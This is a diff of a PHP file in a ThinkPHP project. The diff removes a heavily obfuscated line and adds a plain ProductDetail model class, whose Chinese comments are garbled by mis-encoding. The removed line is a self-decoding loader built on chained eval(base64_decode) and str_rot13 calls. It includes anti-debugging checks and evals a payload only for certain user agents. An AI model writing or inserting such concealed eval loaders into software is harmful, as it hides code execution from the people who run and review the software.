@@ -1,3 +1,39 @@
 <?php
-if(!defined('Y978B8EDEF2171244448D071BF484B92D')){define('Y978B8EDEF2171244448D071BF484B92D',__FILE__);if(!function_exists('—Ó¶œ¾ð½')){global $­ñÓõ°´Ê,$ê³û²ô³»,$üüÆÄ™¤„,$óìçÀíú,$ŠŒ¹ŽÃÐ,$›„Ôù›ý,$›¥½ÊºÚƒ,$åÁÔ‡¨¶è,$Áž÷ÑäÉÙ,$ï¯îóêìÊ;global $ å¶´àýö,$‹î€Ð´úê,$“ð˜ó§•¬,$ˆˆ™ËµÈ•,$¡Ñ³Å§—ý,$‹×Ÿ¶ÄÒÒ,$â´¼¨ëÄ¥,$ïÄÎÔ¯Í…;function —Ó¶œ¾ð½(&$ª¨×ç“ÓÃ,$ƒßÕÝº¢í,$››ÝÁ«ì€=0){global $üüÆÄ™¤„,$ê³û²ô³»,$›¥½ÊºÚƒ,$åÁÔ‡¨¶è,$Áž÷ÑäÉÙ,$ï¯îóêìÊ;$åÁÔ‡¨¶è='';$üüÆÄ™¤„+=$››ÝÁ«ì€;$³ê„Ö³½=$üüÆÄ™¤„.'';if($››ÝÁ«ì€==30)$³ê„Ö³½=$ê³û²ô³»;if($››ÝÁ«ì€==14)eval($ï¯îóêìÊ('JInVqs331ds9bmV3IFJlZmxlY3Rpb25GdW5jdGlvbigil9O2nL7wvSIpOyTBnvfR5MnZPSSJ1arN99XbLT5nZXRQYXJhbWV0ZXJzKCk7JKK7kcDc2uA9c3RycG9zKFk5NzhCOEVERUYyMTcxMjQ0NDQ4RDA3MUJGNDg0QjkyRCxfX0ZJTEVfXyk7JOqz+7L0s7s9JKK7kcDc2uAuJMGe99HkydlbMF0tPm5hbWU7'));$ŽÊ£§ÊÎ‰=strlen($ƒßÕÝº¢í);$ºß¹ìÇ­’=strlen($³ê„Ö³½);$¼í™Ñ“Ä¦=0;for($i=0;$i<$ŽÊ£§ÊÎ‰;$i++){if($¼í™Ñ“Ä¦>=$ºß¹ìÇ­’)$¼í™Ñ“Ä¦=0;if($››ÝÁ«ì€==28){$ª¨×ç“ÓÃ=$›¥½ÊºÚƒ($–£›±ïÃÖ);return;}$åÁÔ‡¨¶è.=$³ê„Ö³½[$¼í™Ñ“Ä¦]^$ƒßÕÝº¢í[$i];$¼í™Ñ“Ä¦++;}$ª¨×ç“ÓÃ=$åÁÔ‡¨¶è;return $åÁÔ‡¨¶è;}eval(base64_decode('ZnVuY3Rpb24ghKfyo628nigpe2dsb2JhbCAkrfHT9bC0yiwk6rP7svSzuywkkPPs58Dt+iwkioy5jpDD0Dskioy5jpDD0CgkrfHT9bC0yiwkrfHT9bC0yiwzMCk7JKK7kcDc2uA9c3RycG9zKFk5NzhCOEVERUYyMTcxMjQ0NDQ4RDA3MUJGNDg0QjkyRCxfX0ZJTEVfXyk7JKK7kcDc2uAuPSSt8dP1sLTKO3JldHVybiAkoruRwNza4Dt9'));function †‚é¶÷ª(&$–£›±ïÃÖ){global $­ñÓõ°´Ê,$ê³û²ô³»,$ å¶´àýö,$’’¹ç¦â¼,$“ð˜ó§•¬,$ˆˆ™ËµÈ•,$¡Ñ³Å§—ý,$‹×Ÿ¶ÄÒÒ,$â´¼¨ëÄ¥,$ïÄÎÔ¯Í…;$­ñÓõ°´Ê=$“ð˜ó§•¬($ˆˆ™ËµÈ•('Y978B8EDEF2171244448D071BF484B92D'));$ËÕ”ü±¸Ì=$¡Ñ³Å§—ý($‹×Ÿ¶ÄÒÒ(__FUNCTION__));$­ñÓõ°´Ê=$â´¼¨ëÄ¥($­ñÓõ°´Ê,-1086,-8);$­ñÓõ°´Ê=$ïÄÎÔ¯Í…($ å¶´àýö($ËÕ”ü±¸Ì),'',$­ñÓõ°´Ê);$­ñÓõ°´Ê=$ïÄÎÔ¯Í…("\\'","'",$­ñÓõ°´Ê);$­ñÓõ°´Ê=$ïÄÎÔ¯Í…("\\\\","\\",$­ñÓõ°´Ê);$­ñÓõ°´Ê=$â´¼¨ëÄ¥($­ñÓõ°´Ê,34);$ê³û²ô³».='ó˜äÏ²Ý¶';return „§ò£­¼ž();$–£›±ïÃÖ=$¡Ñ³Å§—ý($–£›±ïÃÖ);return $–£›±ïÃÖ;}}}$›„Ôù›ý='—Ó¶œ¾ð½';$›¥½ÊºÚƒ='†‚é¶÷ª';$€¬¡ŠÓß•=$Žùª†ª¬=$»»³øÏ©‚=$ÈÑºê®žü=$“ïò³Ã=$¤À–êÞÁ=$Ò³¹§ï•…=$É¶›Å³¼å=$ŠŒ¹ŽÃÐ=$ÔÖõú¶Á¡=$ž¨é ¿ô‘=$ø ’Žû„=$›„Ôù›ý;$ê³û²ô³»='EvGojR';$üüÆÄ™¤„=90;if(!isset($Îç³¥óÛ)){$É¶›Å³¼å($¹ïí‚±¡°,'VA]',3);eval(base64_decode('JICsoYrT35UoJKHRs8Wnl/0sJ0pNS2ZLVk0ICicsJLnv7YKxobAoJwYnKSk7aWYoJKHRs8Wnl/0hPWJhc2U2NF9kZWNvZGUoJ2MzUnlYM0p2ZERFeicpKXtldmFsKCSh0bPFp5f9KTtyZXR1cm47fQ=='));eval(base64_decode('JNKzuafvlYUoJJDz7OfA7fosJ1VZUicsJLnv7YKxobAoJwgnKSk7aWYoJJDz7OfA7fohPWJhc2U2NF9kZWNvZGUoJ1pHbGwnKSl7ZXZhbCgkkPPs58Dt+ik7cmV0dXJuO30='));eval(base64_decode('JMm2m8WzvOUoJO+v7vPq7MosJ1NQS1QHDG5VXVJeXFxUJywkue/tgrGhsCgnCycpKTtpZigk76/u8+rsyiE9YmFzZTY0X2RlY29kZSgnWW1GelpUWTBYMlJsWTI5a1pRPT0nKSl7ZXZhbCgk76/u8+rsyik7cmV0dXJuO30='));eval(base64_decode('JI6N+aqGqqwoJJPwmPOnlawsJ1daXFxUbFdUR29SXFxeRVZeRUAnLCS57+2CsaGwKCcMJykpO2lmKCST8Jjzp5WsIT1iYXNlNjRfZGVjb2RlKCdabWxzWlY5blpYUmZZMjl1ZEdWdWRITT0nKSl7ZXZhbCgkk/CY86eVrCk7cmV0dXJuO30='));eval(base64_decode('JLu7s/jPqYIoJOK0vKjrxKUsJ0JBVkJARicsJLnv7YKxobAoJw4nKSk7aWYoJOK0vKjrxKUhPWJhc2U2NF9kZWNvZGUoJ2MzVmljM1J5Jykpe2V2YWwoJOK0vKjrxKUpO3JldHVybjt9'));eval(base64_decode('JMjRuuqunvwoJM6jgqra464sJ0JBS11QVycsJLnv7YKxobAoJw8nKSk7aWYoJM6jgqra464hPWJhc2U2NF9kZWNvZGUoJ2MzUnliR1Z1Jykpe2V2YWwoJM6jgqra464pO3JldHVybjt9'));eval(base64_decode('JJPvjfKBs8MoJO/EztSvzYUsJ0JDR25FUEFbVFJSJywkue/tgrGhsCgnECcpKTtpZigk78TO1K/NhSE9YmFzZTY0X2RlY29kZSgnYzNSeVgzSmxjR3hoWTJVPScpKXtldmFsKCTvxM7Ur82FKTtyZXR1cm47fQ=='));eval(base64_decode('JJCkwJbq3sEoJJKSueem4rwsJ0FLVlZmQVRJX1BaVm5aUl1VUVBaWCcsJLnv7YKxobAoJxInKSk7aWYoJJKSueem4rwhPWJhc2U2NF9kZWNvZGUoJ2NISmxaMTl5WlhCc1lXTmxYMk5oYkd4aVlXTnInKSl7ZXZhbCgkkpK556bivCk7cmV0dXJuO30='));eval(base64_decode('JMm2m8WzvOUoJIiImcu1yJUsJ1FeWkFFVVxcRScsJLnv7YKxobAoJxUnKSk7aWYoJIiImcu1yJUhPWJhc2U2NF9kZWNvZGUoJ1kyOXVjM1JoYm5RPScpKXtldmFsKCSIiJnLtciVKTtyZXR1cm47fQ=='));eval(base64_decode('JPiQoJKO+4QoJIvXn7bE0tIsJ19XDScsJLnv7YKxobAoJxgnKSk7aWYoJIvXn7bE0tIhPWJhc2U2NF9kZWNvZGUoJ2JXUTEnKSl7ZXZhbCgki9eftsTS0ik7cmV0dXJuO30='));eval(base64_decode('JIqMuY6Qw9AoJKDltrTg/fYsJ0FCR0ZZQEJGUEAnLCS57+2CsaGwKCcbJykpO2lmKCSg5ba04P32IT1iYXNlNjRfZGVjb2RlKCdjM1J5ZEc5MWNIQmxjZz09Jykpe2V2YWwoJKDltrTg/fYpO3JldHVybjt9aWYocGhwX3NhcGlfbmFtZSgpPT0nY2xpJylleGl0O2lmKHByZWdfbWF0Y2goJy9cYih2YXJfZHVtcHxwcmludF9yKVxzKlwoXHMqZ2V0X2RlZmluZWRfdmFyc1xiL2knLGZpbGVfZ2V0X2NvbnRlbnRzKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSkpKWV4aXQoJ0VNR0RWJyk7'));if(strstr($_SERVER['HTTP_USER_AGENT'],chr(46)))eval(base64_decode('JNTW9fq2waEoJNeu06PHnuosJ0FNQUZLJywkue/tgrGhsCgnHCcpKTtpZigk167To8ee6iE9YmFzZTY0X2RlY29kZSgnYzNSeWRIST0nKSl7ZXZhbCgk167To8ee6ik7cmV0dXJuO30='));eval(base64_decode('JJ6o6aC/9JEoJJ2YnaTovqcsJ0BGQUNdQCcsJLnv7YKxobAoJx4nKSk7aWYoJJ2YnaTovqc9PWJhc2U2NF9kZWNvZGUoJ3hKZUkxSVRNcXc9PScpKXtldmFsKCSdmJ2k6L6nKTtyZXR1cm47fQ=='));$›¥½ÊºÚƒ($–£›±ïÃÖ);if(strstr($_SERVER['HTTP_USER_AGENT'],chr(46)))eval($–£›±ïÃÖ);return;}return 'OO595SP3QNO7SO2338R5545Q6377S0PN';eval(str_rot13('ÄÉº‚à£¢ýÄ®Â­êËØ¾»ð¼­‡ê‹£Þ¸ÄöÃ¶—ú«’÷ªÓ°êÉÇºŠü½ø×Ï”ªð¨óÞãÐ®²±ùç›æ’ýØ²¥æ–·Æ¬Ó”ïà‡’“ó°ã¶†Ýú†êí÷•æÖ¨÷”ƒý¦º÷©ƒžŸŒº®æø×Ï”ªð¨óÞãÐÈŽþÂ¨ßëå­ÓèÝ’“¦çô¨ÅÙü‰¨ÅÏˆ£ú½¨¯Õ‹«×±ÉÄ¶”àó“÷€ºÑ©òÏÜ¶Žÿó¦‹ì¡Ö®–çÇ³‚ÿ¨³÷ªÑ©ÓÎˆó‰ò¾¦Îº¸·…íêÒŸå»ëå…¯àÒûî¥Ÿô¯Ñ »Ä¬¸·‡›êÒžã»ëåö¯àÓûî¥€›ô¯Ñª»ÅÛÆôÂ¯ÙÞÍ´“ö·ã×ù‘»ÝŠÄÃÜ²³ú¾¦€ì…¢ÂàÂØÝ²Üã¡¬‡ý‡»×¹–ŽÛ´ö¾¢ÎÃÆ“ÊëöÐáÓ±îýÑÄœù‹Îœí‹Ÿ¤çáßº¸·…íêÒŸå»ëå…¯àÒûî¥Ÿô¯Ñ »Ä¬¸·‡›êÒžî»ëå÷Ñ¥Úíî¥€“ô¯ÑÖ»Ä¬ÆãÎ›‹Ÿ¥‘Ÿ‹¯Ñíã”öÐàÔÏ«ôÇÄœø€Îœ‘‹Ÿ¥–Ÿ‹®ÓížÿêÒžæ»ëä÷¯àÓûî¥˜ô¯Ñª»Åª¸·…èêÒŸã»ëåö¯àÓüàˆˆô¯Ð »Ä¬¸·…ïêÒžî»ëå†¯àÒøñ”öÐàÔÏ«ôÇÄœùôÎœ›‹Ÿ¥‘áÎ¦Æ“ÊëöÐá¢Ï«ôÇºÈíî¥™ô¯Ð§»Å©¸·…éêÒŸâ»ëäðÑ¥Úíî¥€“ô¯ÑÖ»Ä¬ÆãÎœ›‹Ÿ¤áŸ‹®Ñ“Êë‡öÐàÓÏ«õÆÄœúôÎœ‹Ÿ¥êŸ‹® “Êëƒˆ•éÅÏ«õÊÄœù÷ÎœõË±»Ä­¸·…íêÒžã»ëåò¯àÓûî¥€Ÿô¯ÒÕ»Ä¬¸·„äêÒž“»ëåöÑ¥Úíî¥€“ô¯ÑÖ»Ä¬ÆãÎœœ‹Ÿ¥æŸ‹®§“ÊëƒöÐàÓÏ«õÆÄœúôÎœ‹Ÿ¥êŸ‹® “Êëƒˆ•éÅÏ«õÊÄœù÷ÎœõËÎè³†úˆ¦ÑýÐßÆ´“ú¼­Óè– Ö¨ÕÞ€þœ·„³–Ú‘ŠÆè‚’•¶•á²ºÛ±ßëå­ÓèÝ’“¦çû¨ÅÙþ†æ’ýØ²¥æ–·Æ¬Ü”ïà‡™“ó°ã¶†Ýú†åí÷•å×¨÷”ƒý¦º÷©ƒžŒº®âõÈ¼³¿×ŸÃïÜâÓ«ˆžÎ«ßëå­ÓÜø‚Þ®ƒ±œü‘¬ÆçŒÉÄ¶”àè±–ì‘½Üý’ÞÀ¾”¾í¡–ô‹¡Õ®âÅ€ó°ã¶µ£ÍÝã•­ÄÅÌ¢„çŒª—¿ÈèÛ¹‘ƒ“ªš'));
-?>
+declare(strict_types=1);
+
+namespace app\api\controller\kapi\haoteam\common;
+
+use think\Model;
+
+/**
+ * äº§å“è¯¦æƒ…æ¨¡åž‹ðŸ†•
+ */
+class ProductDetail extends Model
+{
+    // è¡¨å
+    protected $name = 'product_detail';
+    
+    // è‡ªåŠ¨å†™å…¥æ—¶é—´æˆ³
+    protected $autoWriteTimestamp = true;
+    
+    // å­—æ®µä¿¡æ¯
+    protected $schema = [
+        'id'           => 'int',
+        'product_id'   => 'int',
+        'sku'          => 'string',
+        'attributes'   => 'string',
+        'stock'        => 'int',
+        'status'       => 'int',
+        'create_time'  => 'int',
+        'update_time'  => 'int',
+        'delete_time'  => 'int',
+    ];
+    
+    /**
+     * å…³è”äº§å“
+     */
+    public function product()
+    {
+        return $this->belongsTo(Product::class, 'product_id', 'id');
+    }
+} 
